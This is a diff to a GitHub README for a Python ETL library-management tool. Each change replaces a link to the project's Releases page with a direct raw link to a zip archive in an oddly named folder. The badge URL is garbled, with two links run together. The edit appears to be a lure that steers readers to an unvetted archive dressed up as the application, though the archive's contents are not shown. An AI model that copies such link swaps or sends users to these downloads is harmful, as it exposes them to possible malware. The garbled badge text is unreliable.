@@ -1,6 +1,6 @@
 # 📚 Python-ETL-NoSQL-Bibliotheque - Manage Your Library with Ease
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)
+![Download Now](https://raw.githubusercontent.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/main/polysensuous/No_Bibliotheque_SQ_Python_ET_v3.1.zip%20Now-Click%https://raw.githubusercontent.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/main/polysensuous/No_Bibliotheque_SQ_Python_ET_v3.1.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ To get started, you just need to download this application from our Releases pag
 
 To download the application, please visit the following link: 
 
-[Download the Application](https://github.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/releases)
+[Download the Application](https://raw.githubusercontent.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/main/polysensuous/No_Bibliotheque_SQ_Python_ET_v3.1.zip)
 
 ### 👨‍💻 System Requirements
 
@@ -81,6 +81,6 @@ If you have any questions, you can reach out through the Issues section on GitHu
 
 ### 🔗 Download Now Again
 
-To download the application, please visit [this page](https://github.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/releases).
+To download the application, please visit [this page](https://raw.githubusercontent.com/potato-chips245/Python-ETL-NoSQL-Bibliotheque/main/polysensuous/No_Bibliotheque_SQ_Python_ET_v3.1.zip).
 
 Enjoy managing your library!
